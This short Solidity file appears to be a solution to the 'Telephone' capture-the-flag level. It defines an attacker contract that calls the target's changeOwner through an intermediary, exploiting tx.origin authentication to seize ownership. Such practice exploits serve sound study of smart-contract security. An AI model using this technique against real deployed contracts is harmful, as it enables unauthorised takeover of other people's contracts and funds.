// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Telephone } from "src/Telephone/Telephone.sol";

contract TelephoneAttackLocal {
    function telephonePwndLocal(Telephone telTarget, address newOwner) public {
        telTarget.changeOwner(newOwner);
    }
}
